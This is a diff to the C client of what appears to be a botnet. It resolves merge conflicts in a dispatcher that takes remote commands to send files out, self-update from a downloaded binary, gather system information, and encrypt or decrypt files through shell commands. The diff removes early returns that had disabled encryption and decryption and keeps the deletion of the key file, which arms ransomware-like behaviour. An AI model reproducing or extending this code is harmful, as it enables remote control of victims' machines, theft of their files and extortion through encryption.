@@ -172,20 +172,21 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
             send_file(sockfd,cmd.params[0]);
             break;
         case UPDATE:
+            output_log("Preparing for UPDATE request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             perform_self_update("/tmp/botnet/downloads/client", sockfd, argc, argv);
             break;
-<<<<<<< src/client/client_utils.c
         case ENCRYPT:
+            output_log("Performing ENCRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             encrypt(sockfd, cmd.params[0]);
             break;
         case DECRYPT:
             output_log("Preparing for DECRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             decrypt(sockfd, cmd.params[0], cmd.params[1]);
             break;
-=======
         case SYSINFO:
+            output_log("Preparing for SYSINFO request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             execute_get_sysinfo(sockfd);
->>>>>>> src/client/client_utils.c
+            break;
         case UNKNOWN:
             output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
             break;
@@ -241,7 +242,7 @@ void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *a
     output_log("perform_self_update : Execv failed to run : %s\n", LOG_ERROR, LOG_TO_ALL, errno);
 }
 
-<<<<<<< src/client/client_utils.c
+
 char random_char(int index) {
     char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     return charset[index];
@@ -302,8 +303,7 @@ void encrypt(int sockfd,const char *filepath){
     if (remove("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") != 0) { // remove the key file
         output_log("encrypt : Failed to delete key file: %s\n", LOG_ERROR, LOG_TO_ALL, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log");
     }
-    output_log("JUST BEFORE ENCRYPTION HERE\n", LOG_WARNING, LOG_TO_CONSOLE);
-    return;
+
     parse_and_execute_command(cmd, sockfd); // Execute the command
     free_command(&cmd); // Free dynamically allocated fields
     free(key); // Free the generated key
@@ -346,15 +346,15 @@ void decrypt(int sockfd, const char *filepath, const char* key) {
     cmd.params[0] = strdup("-c"); // First parameter is the shell option
     cmd.params[1] = strdup(command); // Second parameter is the command to execute
     cmd.params[2] = NULL; // Null-terminate the params array
+    
     output_log("decrypt : Decrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
-    output_log("JUST BEFORE DECYPTION\n", LOG_WARNING, LOG_TO_CONSOLE);
-    return;
+
     parse_and_execute_command(cmd, sockfd); // Execute the command
     free_command(&cmd); // Free dynamically allocated fields
     return;
 }
 
-=======
+
 void execute_get_sysinfo(int sockfd){
     Command **cmds = commands_sysinfo();
     // Execute other commands
@@ -373,4 +373,4 @@ void execute_get_sysinfo(int sockfd){
     }
     free_commands(cmds);
 }
->>>>>>> src/client/client_utils.c
+
